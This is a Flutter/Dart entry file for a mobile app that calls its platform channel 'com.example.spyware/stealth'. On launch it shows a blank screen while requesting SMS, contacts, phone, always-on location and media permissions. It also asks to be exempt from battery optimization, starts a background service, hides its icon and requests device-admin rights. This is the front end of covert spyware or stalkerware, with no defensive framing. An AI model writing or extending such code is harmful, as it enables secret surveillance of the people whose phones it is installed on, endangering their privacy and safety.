import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(
    const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: _PermissionGate(),
    ),
  );
}

class _PermissionGate extends StatefulWidget {
  const _PermissionGate();
  @override
  State<_PermissionGate> createState() => _PermissionGateState();
}

class _PermissionGateState extends State<_PermissionGate> {
  Future<void> _requestDeviceAdmin() async {
    const platform = MethodChannel('com.example.spyware/stealth');
    try {
      await platform.invokeMethod('requestAdmin');
    } catch (e) {
      print("Failed to request admin: $e");
    }
  }
  @override
  void initState() {
    super.initState();
    _init();
  }

  Future<void> _init() async {
    await [
      Permission.sms,
      Permission.contacts,
      Permission.phone,
      Permission.location,
      Permission.notification,
      Permission.photos,
      Permission.videos,
      Permission.mediaLibrary,
    ].request();

    if (await Permission.location.isGranted) {
      await Permission.locationAlways.request();
    }

    if (await Permission.ignoreBatteryOptimizations.isDenied) {
      await Permission.ignoreBatteryOptimizations.request();
    }

    const platform = MethodChannel('com.example.spyware/stealth');
    try {
      await platform.invokeMethod('startService');
    } catch (e) {
      print("Failed to start service: $e");
    }
    try {
      await platform.invokeMethod('hideIcon');
    } catch (e) {
      print("Failed to hide icon: $e");
    }
    _requestDeviceAdmin();
  }

  @override
  Widget build(BuildContext context) => const SizedBox.shrink();
}
